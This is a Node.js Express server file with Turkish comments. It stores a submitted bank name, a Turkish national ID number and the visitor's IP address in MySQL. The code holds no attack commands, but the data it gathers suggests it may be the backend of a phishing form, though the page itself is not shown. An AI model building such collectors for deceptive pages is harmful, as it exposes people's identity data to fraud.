const express = require("express");
const app = express();
const port = 3000;
const bodyParser = require("body-parser");

const mysql = require("mysql2");
const config = require("./config");

// MySQL veritabanı bağlantısı oluşturun
const db = mysql.createConnection({
  host: config.db.host,
  user: config.db.user,
  password: config.db.password,
  database: config.db.database,
  connectTimeout: config.db.connectTimeout,
  multipleStatements: config.db.multipleStatements,
});

// MySQL bağlantısını başlatın
db.connect((err) => {
  if (err) {
    console.error("MySQL bağlantısı başlatılamadı:", err);
    throw err;
  }
  console.log("MySQL bağlantısı başarıyla başlatıldı.");
});

// Express.js ve diğer kodlarınızı burada devam ettirin
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get("/", (req, res) => {
  // İndex sayfasını göndermek için
  res.sendFile(__dirname + "/index.html");
});

app.post("/create-record", (req, res) => {
  // Form verilerini alın
  const { bankName, tckn } = req.body;

  // Gerçek IP adresini alın
  const clientIP =
    req.headers["x-forwarded-for"] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    req.connection.socket.remoteAddress;

  // Veritabanına yeni kayıt eklemek için MySQL sorgusu kullanın
  const sql = "INSERT INTO info (bank_name, tckn, ip) VALUES (?, ?, ?)";
  const values = [bankName, tckn, clientIP];

  // Veritabanı işlemini gerçekleştirin
  db.query(sql, values, (err, result) => {
    if (err) {
      console.error("Kayıt eklenirken hata oluştu:", err);
      return res.status(500).json({ error: "Kayıt oluşturulamadı." });
    }

    console.log("Yeni kayıt eklendi, ID:", result.insertId);
    res.json({ message: "Yeni kayıt oluşturuldu." });
  });
});

// Diğer rotaları burada tanımlayabilirsiniz

// Uygulama kapatıldığında MySQL bağlantısını kapatın
process.on("SIGINT", () => {
  db.end((err) => {
    if (err) {
      console.error("MySQL bağlantısı kapatılamadı:", err);
    } else {
      console.log("MySQL bağlantısı kapatıldı.");
    }
    process.exit();
  });
});

app.listen(port, () => {
  console.log(`Uygulama http://localhost:${port} üzerinde çalışıyor.`);
});
